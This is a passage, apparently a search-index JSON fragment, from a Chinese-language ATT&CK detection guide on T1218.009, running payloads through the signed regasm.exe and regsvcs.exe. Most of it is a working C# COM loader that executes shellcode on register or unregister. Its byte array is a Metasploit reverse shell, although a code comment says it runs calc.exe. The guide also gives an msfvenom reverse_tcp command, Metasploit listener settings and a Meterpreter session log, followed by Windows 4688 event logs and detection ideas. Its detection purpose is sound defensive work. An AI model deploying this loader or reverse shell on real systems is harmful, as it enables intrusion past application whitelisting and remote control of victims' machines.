\u672c\u5730\u8ba1\u7b97\u673a\u7b56\u7565>\u8ba1\u7b97\u673a\u914d\u7f6e>\u7ba1\u7406\u6a21\u677f>\u7cfb\u7edf>\u5ba1\u6838\u8fdb\u7a0b\u521b\u5efa>\u5728\u8fc7\u7a0b\u521b\u5efa\u4e8b\u4ef6\u4e2d\u52a0\u5165\u547d\u4ee4\u884c>\u542f\u7528 \uff0c\u540c\u6837\u4e5f\u53ef\u4ee5\u5728\u4e0d\u540c\u7248\u672c\u64cd\u4f5c\u7cfb\u7edf\u4e2d\u90e8\u7f72sysmon\uff0c\u901a\u8fc7sysmon\u65e5\u5fd7\u8fdb\u884c\u76d1\u63a7\u3002 win7\u9ed8\u8ba4\u8def\u5f84 C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\regasm.exe \u68c0\u6d4b\u65e5\u5fd7 windows \u5b89\u5168\u65e5\u5fd7\uff08\u9700\u8981\u81ea\u884c\u914d\u7f6e\uff09 \u6d4b\u8bd5\u590d\u73b0 \u73af\u5883\u51c6\u5907 \u653b\u51fb\u673a\uff1aKali2019 \u9776\u673a\uff1awindows server 2012 \u653b\u51fb\u5206\u6790 \u751f\u6210\u6076\u610fdll\u7684cs\u6587\u4ef6 \u4e0b\u8f7d\u5730\u5740: https://github.com/222222amor/exp_notes/commit/d3471f1d4617fd5423bb85d41b4ec4f8c72332fc using System; using System.EnterpriseServices; using System.Runtime.InteropServices; /* Author: Casey Smith, Twitter: @subTee License: BSD 3-Clause Create Your Strong Name Key -> key.snk $key = 'BwIAAAAkAABSU0EyAAQAAAEAAQBhXtvkSeH85E31z64cAX+X2PWGc6DHP9VaoD13CljtYau9SesUzKVLJdHphY5ppg5clHIGaL7nZbp6qukLH0lLEq/vW979GWzVAgSZaGVCFpuk6p1y69cSr3STlzljJrY76JIjeS4+RhbdWHp99y8QhwRllOC0qu/WxZaffHS2te/PKzIiTuFfcP46qxQoLR8s3QZhAJBnn9TGJkbix8MTgEt7hD1DC2hXv7dKaC531ZWqGXB54OnuvFbD5P2t+vyvZuHNmAy3pX0BDXqwEfoZZ+hiIk1YUDSNOE79zwnpVP1+BN0PK5QCPCS+6zujfRlQpJ+nfHLLicweJ9uT7OG3g/P+JpXGN0/+Hitolufo7Ucjh+WvZAU//dzrGny5stQtTmLxdhZbOsNDJpsqnzwEUfL5+o8OhujBHDm/ZQ0361mVsSVWrmgDPKHGGRx+7FbdgpBEq3m15/4zzg343V9NBwt1+qZU+TSVPU0wRvkWiZRerjmDdehJIboWsx4V8aiWx8FPPngEmNz89tBAQ8zbIrJFfmtYnj1fFmkNu3lglOefcacyYEHPX/tqcBuBIg/cpcDHps/6SGCCciX3tufnEeDMAQjmLku8X4zHcgJx6FpVK7qeEuvyV0OGKvNor9b/WKQHIHjkzG+z6nWHMoMYV5VMTZ0jLM5aZQ6ypwmFZaNmtL6KDzKv8L1YN2TkKjXEoWulXNliBpelsSJyuICplrCTPGGSxPGihT3rpZ9tbLZUefrFnLNiHfVjNi53Yg4=' $Content = [System.Convert]::FromBase64String($key) Set-Content key.snk -Value $Content -Encoding Byte C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe /r:System.EnterpriseServices.dll /target:library /out:regsvcs.dll /keyfile:key.snk regsvcs.cs C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\regsvcs.exe regsvcs.dll [OR] C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\regasm.exe regsvcs.dll //Executes UnRegisterClass If you don't have permissions C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\regsvcs.exe /U regsvcs.dll C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\regasm.exe /U regsvcs.dll //This calls the UnregisterClass Method */ namespace regsvcser { public class Bypass : ServicedComponent { public Bypass() { Console.WriteLine(\"I am a basic COM Object\"); } [ComRegisterFunction] //This executes if registration is successful public static void RegisterClass ( string key ) { Console.WriteLine(\"I shouldn't really execute\"); Shellcode.Exec(); } [ComUnregisterFunction] //This executes if registration fails public static void UnRegisterClass ( string key ) { Console.WriteLine(\"I shouldn't really execute either.\"); Shellcode.Exec(); } } public class Shellcode { public static void Exec() { // native function's compiled code // generated with metasploit // executes calc.exe byte[] shellcode = new byte[341] { #\u66ff\u6362\u6210\u4f60\u81ea\u5df1\u751f\u6210\u7684 0xfc,0xe8,0x82,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xc0,0x64,0x8b,0x50,0x30, 0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff, 0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf2,0x52, 0x57,0x8b,0x52,0x10,0x8b,0x4a,0x3c,0x8b,0x4c,0x11,0x78,0xe3,0x48,0x01,0xd1, 0x51,0x8b,0x59,0x20,0x01,0xd3,0x8b,0x49,0x18,0xe3,0x3a,0x49,0x8b,0x34,0x8b, 0x01,0xd6,0x31,0xff,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf6,0x03, 0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe4,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b, 0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24, 0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x5f,0x5f,0x5a,0x8b,0x12,0xeb, 0x8d,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c, 0x77,0x26,0x07,0x89,0xe8,0xff,0xd0,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54, 0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x6a,0x0a,0x68,0xc0,0xa8,0x7e,0x92, 0x68,0x02,0x00,0x11,0x5c,0x89,0xe6,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50, 0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5, 0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0a,0xff,0x4e,0x08,0x75,0xec,0xe8,0x67, 0x00,0x00,0x00,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff, 0xd5,0x83,0xf8,0x00,0x7e,0x36,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00, 0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56, 0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7d,0x28,0x58, 0x68,0x00,0x40,0x00,0x00,0x6a,0x00,0x50,0x68,0x0b,0x2f,0x0f,0x30,0xff,0xd5, 0x57,0x68,0x75,0x6e,0x4d,0x61,0xff,0xd5,0x5e,0x5e,0xff,0x0c,0x24,0x0f,0x85, 0x70,0xff,0xff,0xff,0xe9,0x9b,0xff,0xff,0xff,0x01,0xc3,0x29,0xc6,0x75,0xc1, 0xc3,0xbb,0xf0,0xb5,0xa2,0x56,0x6a,0x00,0x53,0xff,0xd5 }; UInt32 funcAddr = VirtualAlloc(0, (UInt32)shellcode.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE); Marshal.Copy(shellcode, 0, (IntPtr)(funcAddr), shellcode.Length); IntPtr hThread = IntPtr.Zero; UInt32 threadId = 0; // prepare data IntPtr pinfo = IntPtr.Zero; // execute native code hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId); WaitForSingleObject(hThread, 0xFFFFFFFF); return; } private static UInt32 MEM_COMMIT = 0x1000; private static UInt32 PAGE_EXECUTE_READWRITE = 0x40; [DllImport(\"kernel32\")] private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect); [DllImport(\"kernel32\")] private static extern IntPtr CreateThread( UInt32 lpThreadAttributes, UInt32 dwStackSize, UInt32 lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId ); [DllImport(\"kernel32\")] private static extern UInt32 WaitForSingleObject( IntPtr hHandle, UInt32 dwMilliseconds ); } } msfvenom\u751f\u6210C#\u683c\u5f0f\u7684payload msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp LHOST=192.168.126.146 LPORT=4444 -f csharp \u751f\u6210DLL C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe /r:System.EnterpriseServices.dll /target:library /out:1.dll /keyfile:key.snk regsvcs.cs C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe /r:System.EnterpriseServices.dll /r:System.IO.Compression.dll /target:library /out:Micropoor.dll /unsafe C:\\Users\\Administrator\\Desktop\\a\\regsvcs.cs #keyfile:key.snk \u53ef\u5ffd\u7565 regsvcs.exe\u52a0\u8f7d\u6216\u5378\u8f7d\u6307\u5b9adll\u65f6\u8be5dll\u5fc5\u987b\u7b7e\u540d\u624d\u53ef\u6267\u884c\u6210\u529f\uff0c\u56e0\u6b64\u547d\u4ee4\u4e2d\u4f7f\u7528\u7684key.snk\u6587\u4ef6\u4e3adll\u7b7e\u540d\u6587\u4ef6\uff0c\u662f\u7531sn.exe\u751f\u6210\u7684\u516c\u94a5\u548c\u79c1\u94a5\u5bf9\uff0c\u5982\u679c\u6ca1\u6709sn\u547d\u4ee4\u4f60\u53ef\u80fd\u9700\u8981\u5b89\u88c5vs\u6216\u8005Microsoft SDKs\u3002\u547d\u4ee4\uff1a sn.exe -k key.snk \u6267\u884c\u76d1\u542c \u653b\u51fb\u673a,\u6ce8\u610f\u914d\u7f6eset AutoRunScript migrate f (AutoRunScript\u662fmsf\u4e2d\u4e00\u4e2a\u5f3a\u5927\u7684\u81ea\u52a8\u5316\u7684\u540e\u6e17\u900f\u5de5\u5177\uff0c\u8fd9\u91ccmigrate\u53c2\u6570\u662f\u8fc1\u79fb\u6728\u9a6c\u5230\u5176\u4ed6\u8fdb\u7a0b) msf5 > use exploits/multi/handler msf5 exploit(multi/handler) > set PAYLOAD windows/meterpreter/reverse_tcp PAYLOAD => windows/meterpreter/reverse_tcp msf5 exploit(multi/handler) > set lhost 192.168.126.146 lhost => 192.168.126.146 msf5 exploit(multi/handler) > set lport 4444 lport => 4444 msf5 exploit(multi/handler) > set AutoRunScript migrate f AutoRunScript => migrate f msf5 exploit(multi/handler) > exploit \u9776\u673a\u6267\u884cpayload C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\regasm.exe /U Micropoor.dll C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\regsvcs.exe Micropoor.dll \u53cd\u5f39shell msf5 exploit(multi/handler) > exploit [*] Started reverse TCP handler on 192.168.126.146:4444 [*] Sending stage (180291 bytes) to 192.168.126.156 [*] Meterpreter session 2 opened (192.168.126.146:4444 -> 192.168.126.156:49963) at 2020-04-13 17:24:11 +0800 meterpreter > getsid Server SID: S-1-5-21-3661619627-1912079458-2426250727-500 \u6d4b\u8bd5\u7559\u75d5 \u7ecf\u8fc7\u914d\u7f6e\u540e\u5b89\u5168\u65e5\u5fd7\u80fd\u591f\u6e05\u6670\u7684\u8bb0\u5f55\u547d\u4ee4\u884c\u53c2\u6570\uff0c\u622a\u53d6windows\u5b89\u5168\u4e8b\u4ef64688\u8fdb\u7a0b\u521b\u5efa\u90e8\u5206\u5185\u5bb9\uff1a \u8fdb\u7a0b\u4fe1\u606f: #4688-1 \u65b0\u8fdb\u7a0b ID:0x9f8 \u65b0\u8fdb\u7a0b\u540d\u79f0:C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\RegAsm.exe \u4ee4\u724c\u63d0\u5347\u7c7b\u578b:TokenElevationTypeDefault (1) \u521b\u5efa\u8005\u8fdb\u7a0b ID:0x13c \u8fdb\u7a0b\u547d\u4ee4\u884c:C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\regasm.exe /U Micropoor.dll \u8fdb\u7a0b\u4fe1\u606f: #4688-2 \u65b0\u8fdb\u7a0b ID:0x8f0 \u65b0\u8fdb\u7a0b\u540d\u79f0:C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\RegSvcs.exe \u4ee4\u724c\u63d0\u5347\u7c7b\u578b:TokenElevationTypeDefault (1) \u521b\u5efa\u8005\u8fdb\u7a0b ID:0x13c \u8fdb\u7a0b\u547d\u4ee4\u884c:C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\regsvcs.exe Micropoor.dll \u68c0\u6d4b\u89c4\u5219/\u601d\u8def \u901a\u8fc7\u8fdb\u7a0b\u76d1\u63a7\u6765\u68c0\u6d4b\u548c\u5206\u6790Regsvcs.exe\u548cRegasm.exe\u7684\u6267\u884c\u548c\u53c2\u6570\u3002\u6bd4\u8f83Regsvcs.exe\u548cRegasm.exe\u7684\u8fd1\u671f\u8c03\u7528\u4e0e\u5386\u53f2\u5df2\u77e5\u5408\u6cd5\u53c2\u6570\u53ca\u5df2\u6267\u884c\u4e8c\u8fdb\u5236\u6587\u4ef6\u6765\u786e\u5b9a\u662f\u5426\u6709\u5f02\u5e38\u548c\u6f5c\u5728\u7684\u653b\u51fb\u6d3b\u52a8\u3002\u5728Regsvcs.exe\u6216Regasm.exe\u8c03\u7528\u4e4b\u524d\u548c\u4e4b\u540e\u4f7f\u7528\u7684\u547d\u4ee4\u53c2\u6570\u4e5f\u53ef\u7528\u4e8e\u786e\u5b9a\u6b63\u5728\u6267\u884c\u7684\u4e8c\u8fdb\u5236\u6587\u4ef6\u7684\u6765\u6e90\u548c\u76ee\u7684\u3002 \u53c2\u8003\u63a8\u8350 MITRE-ATT&CK-T1218-009 https://attack.mitre.org/techniques/T1218/009/ \u57fa\u4e8e\u767d\u540d\u5355Regasm.exe\u6267\u884cpayload https://micro8.gitbook.io/micro8/contents-1/71-80/73-ji-yu-bai-ming-dan-regasm.exe-zhi-hang-payload-di-san-ji \u514d\u6740\u8fdc\u63a7\u4e13\u9898 http://sec.nmask.cn/article_content?a_id=8233eefd6b2671799b46d7cbab7ee672","title":"T11218-009-win-\u57fa\u4e8e\u767d\u540d\u5355Regasm.exe\u6267\u884cpayload"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-009-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Regasm.exe%E6%89%A7%E8%A1%8Cpayload/#t11218-009-win-regasmexepayload","text":"","title":"T11218-009-win-\u57fa\u4e8e\u767d\u540d\u5355Regasm.exe\u6267\u884cpayload"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-009-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Regasm.exe%E6%89%A7%E8%A1%8Cpayload/#attck","text":"Windows\u547d\u4ee4\u884c\u5b9e\u7528\u7a0b\u5e8fRegsvcs\u548cRegasm\u7528\u4e8e\u6ce8\u518c.NET COM\uff08\u7ec4\u4ef6\u5bf9\u8c61\u6a21\u578b\uff09\u7a0b\u5e8f\u96c6\u3002\u4e24\u8005\u90fd\u662f\u5fae\u8f6f\u6570\u5b57\u7b7e\u540d\u7684\u3002 \u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u4f7f\u7528Regsvcs\u548cRegasm\u901a\u8fc7\u53d7\u4fe1\u4efb\u7684Windows\u5b9e\u7528\u7a0b\u5e8f\u6765\u4ee3\u7406\u6267\u884c\u4ee3\u7801\u3002\u8fd9\u4e24\u4e2a\u5b9e\u7528\u7a0b\u5e8f\u90fd\u53ef\u4ee5\u901a\u8fc7\u4f7f\u7528\u4e8c\u8fdb\u5236\u6587\u4ef6\u4e2d\u7684\u5c5e\u6027\uff0c[ComRegisterFunction]\u6216[ComUnregisterFunction]\uff0c\u6765\u6307\u5b9a\u5e94\u5728\u6ce8\u518c\u6216\u6ce8\u9500\u4e4b\u524d\u5206\u522b\u8fd0\u884c\u7684\u4ee3\u7801\uff0c\u4ece\u800c\u7ed5\u8fc7\u8fdb\u7a0b\u767d\u540d\u5355\u3002 \u5373\u4f7f\u8fdb\u7a0b\u5728\u6ca1\u6709\u8db3\u591f\u6743\u9650\u7684\u60c5\u51b5\u4e0b\u8fd0\u884c\u5e76\u4e14\u6267\u884c\u5931\u8d25\uff0c\u4e5f\u5c06\u6267\u884c\u5177\u6709\u6ce8\u518c\u548c\u6ce8\u9500\u5c5e\u6027\u7684\u4ee3\u7801\u3002","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-009-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Regasm.exe%E6%89%A7%E8%A1%8Cpayload/#_1","text":"Regasm \u4e3a\u7a0b\u5e8f\u96c6\u6ce8\u518c\u5de5\u5177\uff0c\u8bfb\u53d6\u7a0b\u5e8f\u96c6\u4e2d\u7684\u5143\u6570\u636e\uff0c\u5e76\u5c06\u6240\u9700\u7684\u9879\u6dfb\u52a0\u5230\u6ce8\u518c\u8868\u4e2d\u3002RegAsm.exe\u662fMicrosoft Corporation\u5f00\u53d1\u7684\u5408\u6cd5\u6587\u4ef6\u8fdb\u7a0b\u3002\u5b83\u4e0eMicrosoft.NET Assembly Registration Utility\u76f8\u5173\u8054\u3002 \u8bf4\u660e\uff1aRegasm.exe\u6240\u5728\u8def\u5f84\u6ca1\u6709\u88ab\u7cfb\u7edf\u6dfb\u52a0PATH\u73af\u5883\u53d8\u91cf\u4e2d\uff0c\u56e0\u6b64\uff0cREGASM\u547d\u4ee4\u65e0\u6cd5\u8bc6\u522b\u3002 \u5177\u4f53\u53c2\u8003\u5fae\u8f6f\u5b98\u65b9\u6587\u6863\uff1a https://docs.microsoft.com/en-us/dotnet/framework/tools/regasm-exe-assembly-registration-tool \u8865\u5145\u8bf4\u660e\uff1a\u5728\u9ad8\u7248\u672c\u64cd\u4f5c\u7cfb\u7edf\u4e2d\uff0c\u53ef\u4ee5\u901a\u8fc7\u914d\u7f6e\u7b56\u7565\uff0c\u5bf9\u8fdb\u7a0b\u547d\u4ee4\u884c\u53c2\u6570\u8fdb\u884c\u8bb0\u5f55\u3002\u65e5\u5fd7\u7b56\u7565\u5f00\u542f\u65b9\u6cd5\uff1a \u672c\u5730\u8ba1\u7b97\u673a\u7b56\u7565>\u8ba1\u7b97\u673a\u914d\u7f6e>\u7ba1\u7406\u6a21\u677f>\u7cfb\u7edf>\u5ba1\u6838\u8fdb\u7a0b\u521b\u5efa>\u5728\u8fc7\u7a0b\u521b\u5efa\u4e8b\u4ef6\u4e2d\u52a0\u5165\u547d\u4ee4\u884c>\u542f\u7528 \uff0c\u540c\u6837\u4e5f\u53ef\u4ee5\u5728\u4e0d\u540c\u7248\u672c\u64cd\u4f5c\u7cfb\u7edf\u4e2d\u90e8\u7f72sysmon\uff0c\u901a\u8fc7sysmon\u65e5\u5fd7\u8fdb\u884c\u76d1\u63a7\u3002 win7\u9ed8\u8ba4\u8def\u5f84 C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\regasm.exe","title":"\u6d4b\u8bd5\u6848\u4f8b"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-009-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Regasm.exe%E6%89%A7%E8%A1%8Cpayload/#_2","text":"windows \u5b89\u5168\u65e5\u5fd7\uff08\u9700\u8981\u81ea\u884c\u914d\u7f6e\uff09","title":"\u68c0\u6d4b\u65e5\u5fd7"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-009-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Regasm.exe%E6%89%A7%E8%A1%8Cpayload/#_3","text":"","title":"\u6d4b\u8bd5\u590d\u73b0"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-009-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Regasm.exe%E6%89%A7%E8%A1%8Cpayload/#_4","text":"\u653b\u51fb\u673a\uff1aKali2019 \u9776\u673a\uff1awindows server 2012","title":"\u73af\u5883\u51c6\u5907"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-009-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Regasm.exe%E6%89%A7%E8%A1%8Cpayload/#_5","text":"","title":"\u653b\u51fb\u5206\u6790"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-009-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Regasm.exe%E6%89%A7%E8%A1%8Cpayload/#dllcs","text":"\u4e0b\u8f7d\u5730\u5740: https://github.com/222222amor/exp_notes/commit/d3471f1d4617fd5423bb85d41b4ec4f8c72332fc using System; using System.EnterpriseServices; using System.Runtime.InteropServices; /* Author: Casey Smith, Twitter: @subTee License: BSD 3-Clause Create Your Strong Name Key -> key.snk $key = 'BwIAAAAkAABSU0EyAAQAAAEAAQBhXtvkSeH85E31z64cAX+X2PWGc6DHP9VaoD13CljtYau9SesUzKVLJdHphY5ppg5clHIGaL7nZbp6qukLH0lLEq/vW979GWzVAgSZaGVCFpuk6p1y69cSr3STlzljJrY76JIjeS4+RhbdWHp99y8QhwRllOC0qu/WxZaffHS2te/PKzIiTuFfcP46qxQoLR8s3QZhAJBnn9TGJkbix8MTgEt7hD1DC2hXv7dKaC531ZWqGXB54OnuvFbD5P2t+vyvZuHNmAy3pX0BDXqwEfoZZ+hiIk1YUDSNOE79zwnpVP1+BN0PK5QCPCS+6zujfRlQpJ+nfHLLicweJ9uT7OG3g/P+JpXGN0/+Hitolufo7Ucjh+WvZAU//dzrGny5stQtTmLxdhZbOsNDJpsqnzwEUfL5+o8OhujBHDm/ZQ0361mVsSVWrmgDPKHGGRx+7FbdgpBEq3m15/4zzg343V9NBwt1+qZU+TSVPU0wRvkWiZRerjmDdehJIboWsx4V8aiWx8FPPngEmNz89tBAQ8zbIrJFfmtYnj1fFmkNu3lglOefcacyYEHPX/tqcBuBIg/cpcDHps/6SGCCciX3tufnEeDMAQjmLku8X4zHcgJx6FpVK7qeEuvyV0OGKvNor9b/WKQHIHjkzG+z6nWHMoMYV5VMTZ0jLM5aZQ6ypwmFZaNmtL6KDzKv8L1YN2TkKjXEoWulXNliBpelsSJyuICplrCTPGGSxPGihT3rpZ9tbLZUefrFnLNiHfVjNi53Yg4=' $Content = [System.Convert]::FromBase64String($key) Set-Content key.snk -Value $Content -Encoding Byte C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe /r:System.EnterpriseServices.dll /target:library /out:regsvcs.dll /keyfile:key.snk regsvcs.cs C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\regsvcs.exe regsvcs.dll [OR] C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\regasm.exe regsvcs.dll //Executes UnRegisterClass If you don't have permissions C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\regsvcs.exe /U regsvcs.dll C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\regasm.exe /U regsvcs.dll //This calls the UnregisterClass Method */ namespace regsvcser { public class Bypass : ServicedComponent { public Bypass() { Console.WriteLine(\"I am a basic COM Object\"); } [ComRegisterFunction] //This executes if registration is successful public static void RegisterClass ( string key ) { Console.WriteLine(\"I shouldn't really execute\"); Shellcode.Exec(); } [ComUnregisterFunction] //This executes if registration fails public static void UnRegisterClass ( string key ) { Console.WriteLine(\"I shouldn't really execute either.\"); Shellcode.Exec(); } } public class Shellcode { public static void Exec() { // native function's compiled code // generated with metasploit // executes calc.exe byte[] shellcode = new byte[341] { #\u66ff\u6362\u6210\u4f60\u81ea\u5df1\u751f\u6210\u7684 0xfc,0xe8,0x82,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xc0,0x64,0x8b,0x50,0x30, 0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff, 0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf2,0x52, 0x57,0x8b,0x52,0x10,0x8b,0x4a,0x3c,0x8b,0x4c,0x11,0x78,0xe3,0x48,0x01,0xd1, 0x51,0x8b,0x59,0x20,0x01,0xd3,0x8b,0x49,0x18,0xe3,0x3a,0x49,0x8b,0x34,0x8b, 0x01,0xd6,0x31,0xff,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf6,0x03, 0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe4,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b, 0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24, 0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x5f,0x5f,0x5a,0x8b,0x12,0xeb, 0x8d,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c, 0x77,0x26,0x07,0x89,0xe8,0xff,0xd0,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54, 0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x6a,0x0a,0x68,0xc0,0xa8,0x7e,0x92, 0x68,0x02,0x00,0x11,0x5c,0x89,0xe6,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50, 0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5, 0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0a,0xff,0x4e,0x08,0x75,0xec,0xe8,0x67, 0x00,0x00,0x00,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff, 0xd5,0x83,0xf8,0x00,0x7e,0x36,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00, 0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56, 0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7d,0x28,0x58, 0x68,0x00,0x40,0x00,0x00,0x6a,0x00,0x50,0x68,0x0b,0x2f,0x0f,0x30,0xff,0xd5, 0x57,0x68,0x75,0x6e,0x4d,0x61,0xff,0xd5,0x5e,0x5e,0xff,0x0c,0x24,0x0f,0x85, 0x70,0xff,0xff,0xff,0xe9,0x9b,0xff,0xff,0xff,0x01,0xc3,0x29,0xc6,0x75,0xc1, 0xc3,0xbb,0xf0,0xb5,0xa2,0x56,0x6a,0x00,0x53,0xff,0xd5 }; UInt32 funcAddr = VirtualAlloc(0, (UInt32)shellcode.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE); Marshal.Copy(shellcode, 0, (IntPtr)(funcAddr), shellcode.Length); IntPtr hThread = IntPtr.Zero; UInt32 threadId = 0; // prepare data IntPtr pinfo = IntPtr.Zero; // execute native code hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId); WaitForSingleObject(hThread, 0xFFFFFFFF); return; } private static UInt32 MEM_COMMIT = 0x1000; private static UInt32 PAGE_EXECUTE_READWRITE = 0x40; [DllImport(\"kernel32\")] private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect); [DllImport(\"kernel32\")] private static extern IntPtr CreateThread( UInt32 lpThreadAttributes, UInt32 dwStackSize, UInt32 lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId ); [DllImport(\"kernel32\")] private static extern UInt32 WaitForSingleObject( IntPtr hHandle, UInt32 dwMilliseconds ); } }","title":"\u751f\u6210\u6076\u610fdll\u7684cs\u6587\u4ef6"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-009-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Regasm.exe%E6%89%A7%E8%A1%8Cpayload/#msfvenomcpayload","text":"msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp LHOST=192.168.126.146 LPORT=4444 -f csharp","title":"msfvenom\u751f\u6210C#\u683c\u5f0f\u7684payload"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-009-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Regasm.exe%E6%89%A7%E8%A1%8Cpayload/#dll","text":"C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe /r:System.EnterpriseServices.dll /target:library /out:1.dll /keyfile:key.snk regsvcs.cs C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe /r:System.EnterpriseServices.dll /r:System.IO.Compression.dll /target:library /out:Micropoor.dll /unsafe C:\\Users\\Administrator\\Desktop\\a\\regsvcs.cs #keyfile:key.snk \u53ef\u5ffd\u7565 